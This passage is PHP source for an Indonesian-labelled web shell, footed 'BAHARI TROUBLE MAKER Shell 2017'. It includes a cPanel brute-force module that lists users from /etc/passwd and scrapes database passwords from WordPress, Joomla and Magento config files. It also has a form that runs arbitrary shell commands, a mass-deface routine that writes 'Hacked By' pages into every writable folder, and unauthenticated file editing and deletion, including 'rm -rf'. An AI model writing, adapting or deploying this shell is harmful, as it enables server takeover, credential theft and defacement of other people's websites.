									$dom =  "<font color=red>gabisa ambil nama domain nya</font>";
								} else {
									preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
									foreach($domains_cp[1] as $dj) {
										$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
										$user_cp_url = $user_cp_url['name'];
										if($user_cp_url == $ucp) {
											$dom = "<a href='http://$dj/' target='_blank'><font color=lime>$dj</font></a>";
											break;
										}
									}
								}
							} else {
								$dom = "<font color=red>function is Disable by system</font>";
							}
							echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>) domain ($dom)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>IndoXploit.</font>";
		}
	} else {
		echo "<center>
		<p align='center' dir='ltr'><font face='Tahoma' size='4'>[#] cPanel Brute Force [#]</font></p>		
		<form method='post'>
		<textarea style='width: 450px; height: 150px;' name='user_cp' placeholder='User List'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea>
		<textarea style='width: 450px; height: 150px;' name='pass_cp' placeholder='Password list'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/^[client]$/", $ambil)) {
					preg_match("/password=(.*?)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					} else {
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
}
elseif($_GET['do'] == 'cmd') {
	echo "<form method='post'>
	<font style='text-decoration: underline;'>".$user."@".$ip.": ~ $ </font>
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}
} 
elseif($_GET['do'] == 'mass_deface') {
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "<center><font color=red>DONE</font> -><font color=red>$dirb/$namafile</font></center>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_domen($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "<center><a href='http://$dirb/$namafile' target='_blank'><font color=red>http://$dirb/$namafile</font></a></center>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}elseif($_POST['tipe_sabun'] == 'diskon') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_domen($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Sabun:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<input type='radio' name='tipe_sabun' value='diskon'>domain<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='robots.txt' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Mr.ToKeiChun69</textarea><br>
	<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
	</form></center>";
	}
} 
elseif($_GET['act'] == 'newfile') {
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {
			$act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'newfolder') {
	if($_POST['new_save_folder']) {
		$new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
		if(!mkdir($new_folder)) {
			$act = "<font color=red>permission denied</font>";
		} else {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'rename_dir') {
	if($_POST['dir_rename']) {
		$dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
		if($dir_rename) {
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "<form method='post'>
	<input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
	<input type='submit' name='dir_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete_dir') {
	if(is_dir($dir)) {
		if(is_writable($dir)) {
			@rmdir($dir);
			@exe("rm -rf $dir");
			@exe("rmdir /s /q $dir");
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>could not remove ".basename($dir)."</font>";
		}
	}
	echo $act;
} elseif($_GET['act'] == 'view') {
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font>  <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a>  <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a>  <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a>  <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a>  <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> <br>";
	echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$act = "<font color=lime>Saved!</font>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font>  <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a>   <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a>  <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a>  <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a>  <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> <br>";
	echo "<form method='post'>
	<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' value='Save' name='save' style='width: 500px;'>
	</form>";
} elseif($_GET['act'] == 'rename') {
	if($_POST['do_rename']) {
		$rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font>  <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a>  <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a>  <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a>  <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a>  <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> <br>";
	echo "<form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
	<input type='submit' name='do_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete') {
	$delete = unlink($_GET['file']);
	if($delete) {
		$act = "<script>window.location='?dir=".$dir."';</script>";
	} else {
		$act = "<font color=red>permission denied</font>";
	}
	echo $act;
} else {
	if(is_dir($dir) === true) {
		if(!is_readable($dir)) {
			echo "<font color=red>can't open directory. ( not readable )</font>";
		} else {
			echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
			<tr>
			<th class="th_home"><center>Name</center></th>
			<th class="th_home"><center>Type</center></th>
			<th class="th_home"><center>Size</center></th>
			<th class="th_home"><center>Last Modified</center></th>
			<th class="th_home"><center>Owner/Group</center></th>
			<th class="th_home"><center>Permission</center></th>
			<th class="th_home"><center>Action</center></th>
			</tr>';
			$scandir = scandir($dir);
			foreach($scandir as $dirx) {
				$dtype = filetype("$dir/$dirx");
				$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
				if(function_exists('posix_getpwuid')) {
					$downer = @posix_getpwuid(fileowner("$dir/$dirx"));
					$downer = $downer['name'];
				} else {
					//$downer = $uid;
					$downer = fileowner("$dir/$dirx");
				}
				if(function_exists('posix_getgrgid')) {
					$dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
					$dgrp = $dgrp['name'];
				} else {
					$dgrp = filegroup("$dir/$dirx");
				}
 				if(!is_dir("$dir/$dirx")) continue;
 				if($dirx === '..') {
 					$href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
 				} elseif($dirx === '.') {
 					$href = "<a href='?dir=$dir'>$dirx</a>";
 				} else {
 					$href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
 				}
 				if($dirx === '.' || $dirx === '..') {
 					$act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
 					} else {
 					$act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
 				}
 				echo "<tr>";
 				echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>$href</td>";
				echo "<td class='td_home'><center>$dtype</center></td>";
				echo "<td class='td_home'><center>-</center></th></td>";
				echo "<td class='td_home'><center>$dtime</center></td>";
				echo "<td class='td_home'><center>$downer/$dgrp</center></td>";
				echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
				echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
				echo "</tr>";
			}
		}
	} else {
		echo "<font color=red>can't open directory.</font>";
	}
		foreach($scandir as $file) {
			$ftype = filetype("$dir/$file");
			$ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
			$size = filesize("$dir/$file")/1024;
			$size = round($size,3);
			if(function_exists('posix_getpwuid')) {
				$fowner = @posix_getpwuid(fileowner("$dir/$file"));
				$fowner = $fowner['name'];
			} else {
				//$downer = $uid;
				$fowner = fileowner("$dir/$file");
			}
			if(function_exists('posix_getgrgid')) {
				$fgrp = @posix_getgrgid(filegroup("$dir/$file"));
				$fgrp = $fgrp['name'];
			} else {
				$fgrp = filegroup("$dir/$file");
			}
			if($size > 1024) {
				$size = round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			}
			if(!is_file("$dir/$file")) continue;
			echo "<tr>";
			echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
			echo "<td class='td_home'><center>$ftype</center></td>";
			echo "<td class='td_home'><center>$size</center></td>";
			echo "<td class='td_home'><center>$ftime</center></td>";
			echo "<td class='td_home'><center>$fowner/$fgrp</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
			
			echo "</tr>";
		}
		echo "</table>";
		if(!is_readable($dir)) {
			//
		} else {
		echo"<br>";	
		}
}
?>
<link href='http://fonts.googleapis.com/css?family=Give+You+Glory' rel='stylesheet' type='text/css'>
</center></span><footer id="ftr" style="position:fixed; left:0px; right:0px; bottom:0px; background:transparent); text-align:right;">
<font color="purple" size="2" face="Give You Glory">&copy; BAHARI TROUBLE MAKER Shell 2017</font></footer>
</html>